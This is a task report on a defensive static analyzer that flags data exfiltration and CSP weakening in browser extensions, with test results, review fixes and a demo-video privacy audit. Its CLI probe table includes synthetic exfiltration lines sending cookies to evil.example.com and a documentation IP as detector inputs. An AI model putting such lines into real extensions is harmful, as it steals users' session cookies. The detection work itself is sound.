# PENT-17 — Browser-extension exfiltration endpoint & CSP analyzer

| Field | Value |
|---|---|
| Task | PENT-17 (MYO062) |
| Author | Hamza Arda Karabacak (`frudotz`) |
| Branch | `feat/extension-exfil-analyzer` (developed and verified on base `90f571f6`; rebased onto `c4a2592a`) |
| Deliverables | [`scripts/analysis/ext_exfil.py`](../../../scripts/analysis/ext_exfil.py) (v1.1.0), [`scripts/analysis/tests/test_ext_exfil.py`](../../../scripts/analysis/tests/test_ext_exfil.py), this report (`docs/tasks/PENT-17/REPORT.md`) |
| Reservation | [`reservations/PENT-17.json`](../../../reservations/PENT-17.json) |
| Demo video | [`PENT-17-demo.mp4`](../../../PENT-17-demo.mp4): 2:47 live recording of the current v1.1.0 (149 tests passing, clean fixture exit 0, flagged fixture exit 1, robustness fixture exit 0). No personal paths on screen. See §7. |

## 1. Scope

`ext_exfil.py` is a **static, offline** analyzer for unpacked Chrome/Edge/Firefox
extensions (Manifest V2 and V3). It uses only the Python standard library and needs
**Python 3.9 or later**. On an older interpreter it exits 2 with a one-line message.

- **Offline.** Extension files are read as text; no extension code runs. Host names are
  classified lexically: no DNS lookup is made and no host is contacted. The module imports
  no `socket`, `urllib`, `http`, `ssl`, `requests` or `subprocess`.
- **Read-only.** It never writes inside the analyzed tree. An `-o` path inside the analyzed
  directory (or the manifest's directory) is refused with exit 2.
- **Links.** Symlinks, NTFS junctions and every other Windows reparse point are not followed.
  Junctions are detected through the `lstat` reparse attribute, so detection does not depend
  on `os.path.isjunction` (Python 3.12+). The walk also keeps a visited-directory set
  (device, inode), so a link loop that slips past those checks is still walked only once.
  Anything resolving outside the extension root is skipped and noted.
- **What gets scanned.**
  - Every file the manifest loads is scanned, wherever it lives, including `node_modules/`:
    background service worker, scripts and page; content scripts; popup, options, devtools
    and side-panel pages; URL overrides; sandbox pages; `user_scripts`; non-wildcard
    web-accessible resources.
  - So is every package file that scanned code loads: HTML `<script>`/`<iframe>`,
    `importScripts(...)` (all arguments), `import`/`export ... from`, `import()`,
    `new Worker`/`SharedWorker`, `chrome.runtime.getURL`, `executeScript({files|file})`,
    `registerContentScripts({js})`, `{url|path|page: ...}` and `.src = '...'`. These are
    percent-decoded and resolved relative to the file, then to the package root.
  - `dist/` and `build/` are always walked.
  - `node_modules/`, `coverage/` and `.next/` are walked only when they contain such a
    referenced file, or with `--include-vendored`. Otherwise each one is named under
    Limitations. `.git/` and `__pycache__/` are never walked.
- **Bounded resources.** Every read is size-capped with a bounded read: `manifest.json` 1 MiB
  (over the cap: exit 2), each source file 2 MiB, each DNR rule file 8 MiB, at most 1000 rule
  resources and 64 MiB of rule files in total, at most 2000 endpoint references kept per
  file, and the `--max-files` cap (default 2000). The walk stops at the cap. Content scanning
  is linear-time: tag bodies are quote-aware and have no lazy scan to end-of-file, string
  literals are bounded, snippet extraction is bounded, and numeric host parts are length-checked
  before `int()`.
- **Incomplete analysis is never reported clean.** When any cap or truncation leaves content
  unread, a medium `analysis.incomplete-coverage` finding is added, so the exit code is 1.
- **No tracebacks.** Malformed manifest or rule shapes (for example `"content_scripts": 7`)
  are ignored with a note. Unparseable input, an unexpected internal error, a closed or broken
  stdout, and any unwritable output all exit 2 with one sanitized line on stderr. Exit 1 means
  only "medium/high findings".
- **Output never fails on the console encoding.** Characters that stdout or stderr cannot
  encode (for example CJK on a cp1254 console or redirect) are written as `\uXXXX`. `-o` writes
  UTF-8 with `backslashreplace`, so a lone surrogate cannot abort the write. JSON output is
  ASCII-only and strict (`allow_nan=False`; a `NaN` manifest value is reported as a string).
- **Sanitized display.** Text and Markdown output escape C0/C1 controls and bidi/format and
  invisible characters in every extension-supplied string. This covers zero-width characters,
  soft hyphen, U+180E, variation selectors, U+FFF9–FFFB and Unicode tag characters
  (`U+E0041` is shown as `\U000e0041`). Markdown output also backslash-escapes Markdown/HTML
  metacharacters. Non-ASCII host names are shown in IDNA/punycode form with a
  `[non-ASCII IDN]` tag and a homoglyph note.

**What the hosts in the report mean:** they are destinations *statically referenced* in the
extension package — **potential destinations, never observed traffic**. Every report format
repeats this, and the JSON carries `"offline": true` and `"observed_network_activity": false`.

Use it only on extensions you own or are authorized to assess.

## 2. What it reports

1. **Destination inventory.**
   - Sources: `fetch`, XHR `.open`, `sendBeacon`, `WebSocket`, `EventSource`,
     `importScripts`, `import()`, `new Image().src`, `.src`/`.href`/`.action` assignments,
     HTML `script`/`iframe`/`frame`/`link`/`img`/`form` attributes, declarativeNetRequest
     redirects, quoted URL literals, and the manifest URL fields: `homepage_url`,
     `update_url`, the search provider's `search_url`/`suggest_url`/`alternate_urls`/…,
     the `homepage`/`startup_pages` overrides, the author/developer URL, and the Firefox
     gecko `update_url`.
   - Parsing follows the WHATWG URL rules. Special schemes may omit or double their slashes
     (`https:host`, `https:/\host`). `\` counts as `/`. A leading `//`, `/\` or `\\` is
     scheme-relative. Tab and newline characters are removed. Hosts are percent-decoded and
     lower-cased. JS escapes (`\x65`, `e`, `\/`) are decoded. Scheme matching is
     case-insensitive.
   - IPv4 hosts in decimal, hex, octal and short dotted forms are normalized. IPv4-mapped,
     6to4, Teredo and NAT64 IPv6 hosts are classified by their embedded IPv4 address.
   - A sink whose URL is built at runtime is recorded as `<dynamic>`: `` `${base}/x` ``,
     `'//' + h`, `'https://' + h`, or a variable.
   - Classes: `external`, `vendor`, `local`, `browser-store`, `extension-origin`, `dynamic`.
     - `vendor` means the exact host self-declared in `homepage_url`/`update_url` (without a
       leading `www.`) and its subdomains. It is never widened to the parent domain or a TLD.
       It is a label, not a trust signal, and findings still fire for it.
     - `extension-origin` is a protocol-relative URL in an extension page or background
       script. Those resolve to `chrome-extension://`, not the network, so they raise no
       finding. In content scripts and injected files they stay `external`.
2. **Exfiltration heuristics.** These are static leads with a confidence value and
   alternative explanations, not proof.
   - Sensitive source + external sink in one file: high. It is medium when the only source
     is extension/web storage.
   - Sensitive source + a variable-URL request + URL literals in the same file: medium
     (`exfil.sensitive-source-to-possible-sink`).
   - webRequest body/header capture.
   - Beacon/pixel.
   - Cleartext endpoint.
   - Raw-IP endpoint.
   - Remote code.
   - DNR redirect to an external host.
   - DNR `transform.scheme` downgrade to http/ws/ftp: medium.
   - Search-provider override sending queries to an outside host: medium.
   - Dynamic endpoint with broad host access: low.
   - Runtime DNR rules: info.
   - `analysis.incomplete-coverage` (see §1).
3. **CSP relaxations.** Inspected policies: the MV2 string policy, MV2
   `sandbox.content_security_policy` (only when `sandbox.pages` is non-empty), and MV3
   `extension_pages`/`sandbox`. Inspected directives: `script-src` (or `default-src`),
   `script-src-elem`, `script-src-attr`, `worker-src` (or `child-src`), `object-src` and
   `connect-src`.
   - `'unsafe-inline'`:
     - **low** when the same directive has a nonce, hash or `'strict-dynamic'`, because
       CSP2+ browsers ignore it then;
     - **low** in an MV2 extension-page policy, because Chromium documents it has no effect
       there (other engines may differ);
     - otherwise high, capped at medium on sandboxed pages.
   - `chrome-extension://<id>` / `moz-extension://` sources are a low
     `csp.other-extension-script-source`, not remote code.
   - MV3 relaxations are labelled "declared; the browser may reject".
4. **Security-header tampering.**
   - DNR `remove`/`set` of CSP, XFO, XCTO, COOP/COEP/CORP, Permissions-Policy, HSTS or
     Referrer-Policy. `append` of a CSP header is **info**, because an added policy can only
     tighten.
   - Request-header rewriting of `Origin`, `Referer` or `Cookie`.
   - `webRequest.onHeadersReceived`, de-duplicated per header:
     - **high** with a `'blocking'` spec (string or `OnHeadersReceivedOptions.BLOCKING`) and
       a returned `{responseHeaders}`;
     - **medium** with only one of the two;
     - **low** ("read") for a read-only listener.
5. **Limitations**, naming every skipped directory, link, oversized file and capped item.

## 3. Usage

```
python scripts/analysis/ext_exfil.py <extension_dir | manifest.json> \
    [--format text|md|json] [-o OUT] [--max-files N] [--include-vendored]
```

| Option | Meaning |
|---|---|
| `--format` | `text` (default), `md` or `json` (deterministic, sorted, strict ASCII JSON) |
| `-o, --output` | write the report to a file outside the analyzed tree |
| `--max-files` | source-file cap (default 2000). Hitting it gives `analysis.incomplete-coverage` |
| `--include-vendored` | also walk `node_modules/`, `coverage/` and `.next/` |

Exit codes: `0` = no medium/high findings, `1` = medium/high findings (this includes an
incomplete analysis), `2` = usage/input/output error. Errors go to stderr as one sanitized
line, never a traceback.

## 4. Verification (2026-11-13, Windows 11, Python 3.13.14)

### 4.1 Focused tests — `scripts/analysis/tests/test_ext_exfil.py`

```
PYTHONDONTWRITEBYTECODE=1 python -m pytest scripts/analysis/tests/test_ext_exfil.py -q -p no:cacheprovider
```

**Result: 149 passed, 0 skipped, 0 failed, exit 0 (≈22 s).** This used pytest 9.2.0 in a
job-local venv outside the repo. It was re-run in the final readiness pass on Python 3.13.2
(also pytest 9.2.0): 149 passed in 20.6 s, exit 0. The same result is visible in the demo video. The Windows-only junction tests ran for real, and so did the
symlink tests (symlink creation is permitted on this host). On POSIX the junction tests are
skipped.

- Every fixture is synthetic, built in pytest `tmp_path`, and uses RFC 2606/6761 names and
  RFC 5737/3849 documentation addresses only.
- The 98 test cases added in this correction cover each review item, typically with one test
  or parametrized group per item (§6).
- Timing tests bound adversarial inputs (≈400 KB to 2 MiB) to a few seconds; the slowest
  takes about 2.7 s.

**Regression proof.** The same test file was run against the previous analyzer (v1.0.0,
SHA-256 `a1d368d5…5e14e5b`):

- **63 of the 128 runnable tests fail.** The 12 masking tests from the final review pass on
  v1.0.0 by design: they assert that v1.1.0 never sees less than v1.0.0.
- The remaining 21 tests (adversarial-timing and junction-loop cases) were deselected,
  because they stall the old analyzer:
  - the pixel case took 9 s against a 3 s bound;
  - the `<img ` case was still running when it was killed at 90 s;
  - the junction loop did not finish in 30 s per parameter.

### 4.2 CLI probes (real subprocesses, no mocks)

Synthetic fixtures in the job temp directory, deleted afterwards. Both versions were run
with `python -I -B`.

| Probe | v1.0.0 (previous) | v1.1.0 (current) |
|---|---|---|
| Clean manifest named `日本`, stdout redirected with `PYTHONIOENCODING=cp1254`, `--format text` / `md` | **exit 1 + `UnicodeEncodeError` traceback** | exit 0, name written as `\u65e5\u672c` |
| Same, `--format json` | exit 0 | exit 0 |
| 2 MiB `"<img " * n` HTML + 2 MiB `"new Image(" * n` JS | review extrapolated ≈3 h per file | **2.6 s total**, exit 0 |
| `background.service_worker: "dist/bg.js"` with cookie → `fetch` + beacon | **exit 0, no hosts** | exit 1, HIGH findings |
| DNR `rule_resources.path` = the background `bg.js` | **exit 0, 0 files scanned** | exit 1 |
| `fetch('https:evil.example.com/c')` + `chrome.cookies` | **exit 0** | exit 1 |
| `fetch('http://[::ffff:203.0.113.9]/u', {body: document.cookie})` | **exit 0 (classed local)** | exit 1 |
| Read-only `onHeadersReceived` that logs `x-frame-options` | **exit 1 (HIGH)** | exit 0 (low, "read") |
| Missing non-ASCII path, cp1254 stderr | exit 2 | exit 2, `\u65e5` escaped |

### 4.3 Repository runner — `./scripts/run-tests.sh` (real, no mocks)

**Not green on this host: exit 1. Summary: 3 passed, 4 failed, 2 skipped.** This is the same
result as a clean `origin/master` baseline under identical conditions. Since the fast-forward to
`90f571f6`, the runner also runs the Cleanup Lab stages, so these counts replace the earlier
pre-fast-forward figures.

Runs on 2026-11-13, all in Git Bash, no mocks, with a pytest venv first on `PATH` (no
`.venv-test` created, no pip install), `CARGO_NET_OFFLINE=true`:
- baseline: the unmodified runner in a disposable `git archive origin/master` copy,
  14:53:43–14:54:41 UTC;
- current: the same runner on this tree right after, 14:54:46–14:55:33 UTC;
- an earlier post-fast-forward run on this tree with a different interpreter, which gives the same summary.

| Stage | Baseline `origin/master` | Current (PENT-17) |
|---|---|---|
| android-lab/lab pytest | **failed**: 9 failed, 108 passed, 10 skipped, 44 errors | **failed**: 8 failed, 109 passed, 10 skipped, 44 errors |
| source-lab/engine pytest | **failed**: 4 failed, 172 passed | **failed**: 4 failed, 172 passed |
| cleanup-lab/reference/python | **failed**: 35 run; 3 failures, 1 error, 1 skipped | same |
| cleanup-lab/engine | **failed**: 154 run; 58 failures, 14 errors, 4 skipped | same |
| qrust-scan `cargo test` | ok | ok |
| sample analysis smoke | skipped (cp1254 `UnicodeEncodeError`) | skipped (same) |
| `bash -n` (70 scripts) | ok | ok |
| `lat check` | ok | ok |
| dashboard | skipped (`node_modules` absent) | skipped |

**Baseline comparison.** The current tree fails or errors on 132 ids; the baseline fails or errors on 133. Every current
id also fails on the baseline, so no new id appears with PENT-17. These failures are pre-existing on
`origin/master`. The two differences are artifacts:
- The baseline-only failure, `test_content.py::test_the_repo_content_builds_and_the_client_accepts_it`,
  happens because `build-content.py` lists files with `git ls-files` and an archive copy has no
  `.git`. With a temporary git index in the copy, this test passes.
- `test_apk_patcher.py::test_apk_patcher_network_security_config` fails on both trees in the
  same-env runs (`cryptography` is not in that venv). It passed in the earlier run with the other
  interpreter.

The other failures include the `Fixture crawl failed` setup errors (44 in
`test_source_console.py`/`test_source_artifacts.py`) and the cp1254 console. The cp1254 console
also makes the stage-2 smoke `[skip]` with a `UnicodeEncodeError` on an emoji in the analyzer
banner. Evidence: `.orchestrator/implementation/TASK-20261113-142904-2070-baseline-check.md`.

**Supported environments on this host.** None is ready to run the runner green without
installing or starting something:
- Docker's CLI is installed, but its daemon is not running (`dockerDesktopLinuxEngine` pipe
  absent). The runner was not run in Docker in this pass.
- WSL has Ubuntu 24.04 and kali-linux, but neither has `pip`, `ensurepip` or `pytest`.
- The unmodified runner, run once in WSL Ubuntu on a disposable LF copy of `HEAD` plus the
  PENT-17 files in WSL's `/tmp` (deleted afterwards), exited 1 with 2 passed, 4 failed,
  1 skipped:
  - venv creation needs `apt install python3.12-venv` (sudo), so both pytest stages failed;
  - the Windows-side `lat` binary failed through interop;
  - the stage-2 smoke and `bash -n` passed.
- No package was installed and no service was started or changed.

Earlier attempts, kept for context and not re-run in this correction:
- A disposable Linux container without mocks gave 3 passed, 1 failed (Docker-dependent HTTP
  409 test), 2 skipped.
- A container with a mocked `docker` shim exited 0. That is **not** a real pass.

The runner is **not** claimed green.

`run-tests.sh` does not collect `scripts/analysis/tests`; those tests are verified by §4.1.
The runner was left unchanged to keep the change within PENT-17.

## 5. Changed files

| File | Status |
|---|---|
| `scripts/analysis/ext_exfil.py` | new (1717 lines, v1.1.0) |
| `scripts/analysis/tests/test_ext_exfil.py` | new (1381 lines, 90 test functions → 149 collected cases) |
| `docs/tasks/PENT-17/REPORT.md` | new |
| `PENT-17-demo.mp4` | new; replaced in the privacy pass with a redacted v1.1.0 recording (SHA-256 `88c0884e…498a`, 4,383,865 bytes) |

No other tracked file is modified, except `reservations/PENT-17.json`, whose `pr` field
links the delivery PR (#174).

## 6. Review findings and their resolution

Two review passes were addressed. The first was the independent deep review
(`.orchestrator/reviews/TASK-20261113-142904-2070-independent.md`). The second was a fresh
independent review of the fixed v1.1.0, which found regressions and residuals; these are
fixed too.

| ID | Issue | Resolution |
|---|---|---|
| H1 | Non-ASCII output: `UnicodeEncodeError`, exit 1 | `_emit` encodes with `backslashreplace` to the stream's encoding. Write errors and broken pipes exit 2. stderr goes through the same path. |
| H2 | Quadratic `HTML_TAG_RE` and pixel regex | Tag tokenizer without lazy scans. Pixel args bounded and `(`-free. Literal reads bounded. Snippet search bounded. |
| H3 | `dist/`/`build/`/`node_modules/` code silently skipped | Manifest-referenced files and code reachable from them are always scanned. `dist/`/`build/` are walked. Vendored dirs are named, and walked when they hold referenced code or with `--include-vendored`. |
| M1 | A DNR path suppressed the source scan | Only a file that parses as a JSON rule array is excluded from the literal scan. Referenced code is always scanned. Invalid rule files are noted as "scanned as a source file instead". |
| M2 | Rule resources after #50 silently dropped | The cap is 1000 resources plus a 64 MiB total budget, with an explicit "NOT reported" limitation that triggers `analysis.incomplete-coverage`. |
| M3 | WHATWG URL forms and dynamic sinks missed | WHATWG-style parsing (§2.1). Runtime-built sinks become `<dynamic>`. Case-insensitive literals. JS/JSON escapes decoded. |
| M4 | Mapped IPv6 classed local; numeric IPv4 forms missed | Mapped, 6to4, Teredo and NAT64 are unwrapped. Decimal/hex/octal/short IPv4 is normalized. |
| M5 | Junction loop on Python < 3.12; walk past the cap | Reparse-attribute check, visited-directory set, early stop at the cap, Python 3.9+ enforced. |
| M6 | Read-only `onHeadersReceived` reported HIGH | Severity depends on the blocking spec and the returned headers (§2.4). De-duplicated per header. |
| L1 | `chrome-extension://` source reported as remote | Separate low check. |
| L2 | `'unsafe-inline'` with nonce/hash; MV2 wording | Low, with the browser-specific effect stated. |
| L3 | DNR CSP `append` called weakening; scheme downgrade missed | `append` of CSP is info. New `exfil.dnr-scheme-downgrade`. The transform host is shown scheme-relative when no scheme is set. |
| L4 | Protocol-relative script in an extension page raised HIGH | `extension-origin` class, no finding. |
| L5 | Vendor label widened to the parent domain | Exact host (minus `www.`) only. Never a bare TLD. |
| L6 | Manifest destinations not inventoried | Search-provider URLs, homepage/startup overrides, author/developer URLs and gecko `update_url`. New search-provider finding. |
| L7 | Invisible characters and IDN hosts shown raw | Extended escape set. Punycode with a tag and a homoglyph note. |
| L8 | Storage-only source raised HIGH | Medium, confidence 0.4. |
| M-a (2nd) | A 4096-character tag cap let attribute padding hide `<script src>` | No cap. Quote-aware body (`>` inside a quoted value no longer ends the tag). |
| M-b (2nd) | `OnHeadersReceivedOptions.BLOCKING` or a spec defined elsewhere gave low | Enum recognised. A returned `responseHeaders` alone is medium. |
| M-c (2nd) | Quadratic snippet extraction on one-line files | Bounded search. At most 2000 endpoints per file, with the overflow noted and flagged as incomplete. |
| M-d (2nd) | A 5000-digit host aborted the run (int-string limit) | Over-long numeric parts are rejected before `int()`. |
| L-a…L-e (2nd) | Surrogate `-o` failure; URL held in a variable; incomplete analysis exiting 0; attribute text inside another attribute's value; `NaN` in JSON | `-o` uses `backslashreplace`. New possible-sink finding. `analysis.incomplete-coverage`. Sequential attribute tokenizer. `_json_scalar` plus `allow_nan=False`. |
| N1 (3rd) | My first attribute tokenizer was quadratic on whitespace or `/` runs (100 KB: 68 s) | The match now starts at the attribute name. A 2 MiB tag takes ≈1.8 s. |
| N2 (3rd) | A stray quote in a comment, inline script or natural text (`alt=it's`) swallowed the next `<script>` | A quote counts only right after `=`. Comments and raw-text element content are masked first. |
| Final pass | The masking itself could be bypassed: `<!-->`, `--!>`, `<script-x>`, `iframe`/`noembed`/`noframes`, a U+0130 offset shift; and a U+0130 input crashed with exit 2 | ASCII-only lowering keeps offsets aligned. Comment-end forms and tag-name boundaries are handled. More raw-text elements are listed. A `None` match is guarded. **The tag pass also runs over the raw text and the results are merged, so masking can only add detections.** Every reproduced bypass is a regression test. |
| Residuals | M-b: `const r = {responseHeaders: …}; return r` gave low. H3: `new URL(…, import.meta.url)`, `setAttribute('src')`, `setPopup`, `window.open`, `location.href`, `panels.create`, `document.write('<script src>')`. Endpoint cap demoting a HIGH. A file name forging a coverage gap. | `responseHeaders:` counts as a rewrite lead. These reference forms are now parsed. The soft cap keeps every new (kind, host), with a hard cap of 10000. Coverage gaps are marked by type (`Gap`), not by wording. |

### 6.1 Review process and residual status

- **Passes.** The independent review agent ran four passes on this correction. Each was
  read-only on the repo, used synthetic fixtures with reserved hosts, and compared results
  against v1.0.0. The last pass reported, all reproduced:
  - no super-linear input among 31 shapes of 2 MiB (worst 2.8 s);
  - no exit code other than 0/1/2 and no traceback;
  - the masking bypasses and the crash in the "Final pass" row above.
- **Final fix.** Those were fixed afterwards by merging a raw tag pass with the masked one.
- **Verification of the final fix.** I re-measured the worst timing shapes on the final code:
  every one stays under 2 s at 2 MiB (`<` repeated: 1.9 s). The reviewer's reproduced inputs
  are regression tests that pass.
- **Not done.** The final fix itself has **not** been through another independent review
  pass.
- **Known residuals, by design:**
  - A two-label homepage on a shared-hosting suffix (`https://github.io/`) still labels every
    `*.github.io` host `vendor`. This needs a public-suffix list. It affects the label only,
    and findings still fire.
  - `getURL('x/' + 'y.js')` and other computed paths cannot be resolved statically.
  - Code in an unwalked vendored directory, loaded only through an unparsed form, is not
    scanned. That directory is named under Limitations.


## 7. Known limitations and open items

- **Heuristics.**
  - Analysis is regex/lexical. Obfuscated or computed URLs, cross-file data flow, and
    sources and sinks in different files are not traced. Findings are leads, not proof.
  - A URL assembled from several variables, or loaded from storage or the network, is
    `<dynamic>` at best.
- **Unreferenced vendored code.** Code in `node_modules/`, `coverage/` or `.next/` that is
  loaded only by a form the tool does not parse is not scanned unless `--include-vendored`
  is given. Each such directory is listed by name under Limitations.
  - Forms that are parsed: the manifest fields, the HTML tags and the JS reference patterns
    in §1.
  - Examples of forms that are not: URLs computed at runtime, and wildcard WAR entries not
    otherwise referenced.
- **Encoding variants.**
  - HTML entities are decoded only in attribute values.
  - JS escapes are decoded only in string literals.
  - Unicode escapes in identifiers (`fetch`) are not normalized.
- **Protocol-relative URLs.**
  - Bare `'//host'` string literals that are not at a sink are not extracted.
  - A JS file loaded by an extension page but not declared as a background script is
    treated conservatively, as if it could run in a web page.
- **CSP.**
  - `'strict-dynamic'` is modelled only as neutralizing `'unsafe-inline'`.
  - Firefox-specific CSP enforcement differences are not modelled beyond the MV2 note.
- **Interpreter coverage.** Python 3.9–3.11 behaviour (no `os.path.isjunction`) is covered
  by tests that delete `isjunction` on 3.13. No real 3.9–3.11 interpreter was run.
- **Constants.** `STORE_HOSTS` lists real browser-store host names as classification
  constants only; they are never contacted.
- **Demo video (privacy-redacted re-recording, 2026-11-13).**
  - The file: `PENT-17-demo.mp4`.
    - Length 2:47.2. H.264 High, 1112×626, 30 fps, 5015 frames. No audio track (the capture
      had no audio source and the silent track was dropped by a lossless remux).
    - 4,383,865 bytes, SHA-256 `88c0884e225efd18f8bacf20a41fa214aa0f678286d85fabecb2313b2132498a`.
    - `ffprobe` reads it cleanly, and a full `ffmpeg` decode reported 0 errors.
  - Why it was re-recorded. The previous v1.1.0 recording (SHA-256 `c58e4e31…e471`) was
    technically valid, but its on-screen pytest header and fixture paths exposed a local
    home-directory path. That file is withdrawn and kept only as a local backup outside the
    repo. It must not be published.
  - What it shows. A genuine live run in one dedicated Windows Terminal window, scripted by a
    driver that types each command and then executes it, at a sanitized `PS PENT17>` prompt:
    - `VERSION = "1.1.0"`;
    - Python 3.13.2 / pytest 9.2.0;
    - the focused suite (run with `--no-header`), `149 passed in 20.27s`, pytest exit 0;
    - the clean synthetic fixture: exit 0;
    - the flagged synthetic fixture: exit 1, with 2 HIGH `exfil.sensitive-source-to-external-sink`
      and 2 MEDIUM `exfil.beacon-or-pixel`, and JSON `offline= True`,
      `observed_network_activity= False`;
    - the robustness fixture: a bidi/zero-width/tag-character name shown escaped, malformed
      `content_scripts: 7` and `permissions: "not-a-list"` noted, a 2,097,112-byte `<img ` page,
      and exit 0 in 1.52 s with no traceback.
  - Privacy.
    - Repo paths on screen are relative.
    - Fixtures and outputs live on a temporary `SUBST` scratch drive, so they appear only as
      `X:\fixtures\…` and `X:\results\…`.
    - Every visually distinct frame (1,516, after `mpdecimate`) was text-scanned with OCR. There
      were no matches for a user name, a home or profile directory, `AppData`, or any other
      absolute local path.
  - Fixtures are synthetic and use reserved `example.*` hosts only. The OCR host scan found
    no other domains.
  - How it was verified.
    - A headless dry run came first, with the same commands and expected exit codes. Its
      output had no personal-path matches.
    - Frames at 2 s, 60 s, 90 s, 108 s, 121 s, 125 s and 166 s were inspected visually, along
      with a 10-second contact sheet.
    - Mean luma per second stays between 28 and 51, so there are no black frames.
    - Only the one window is captured.
  - Isolation.
    - The recorder was a portable OBS 30.1.0 copy in the job temp directory, with its own
      config and a localhost-only websocket on port 4466 used for Start/StopRecord.
    - It used one Window Capture source (WGC, client area, cursor off) bound to the window
      title `PENT17 Demo 56163ce5`.
    - The window was launched with
      `wt.exe -w new new-tab --title 'PENT17 Demo' -d <repo> powershell.exe …`, without
      `--size` or `--pos`. Its existence was checked (`CASCADIA_HOSTING_WINDOW_CLASS`,
      client area 1113×627) before OBS started.
    - It was closed afterwards with a window-close message to that window only. The shared
      Windows Terminal process was not stopped.
  - The user's OBS was not used.
    - Its running instance (PID 20056, Program Files) was left alone.
    - `%APPDATA%\obs-studio` still has 35 files, `global.ini` keeps the same SHA-256
      (`F88514B3…`), and no `PENT17` profile exists there.
    - **Unexplained anomaly (unchanged, disclosed again).** `basic\profiles\İsimsiz\basic.ini`
      gets a new modification time while its content stays byte-identical (SHA-256
      `DA5B47A6…9884`).
      - The earlier pass saw this at 17:15:04 local, near a portable-OBS start.
      - This pass saw it again at 17:37:38 local, a few seconds after the portable instance was
        stopped.
      - Both portable instances ran with `--portable` and their own config. The cause is
        unknown, and the file was not edited or restored.
  - Earlier attempts did not replace the file:
    - three classic-console captures came out all black;
    - one Windows Terminal launch failed when `--size` was rejected.
- **Repository runner.** `./scripts/run-tests.sh` is not green on this host, for
  pre-existing reasons in code PENT-17 does not touch (§4.3).
- **Docs scope.** `lat.md/` is not updated for this standalone tool. The edit scope was
  limited to the PENT-17 deliverables.
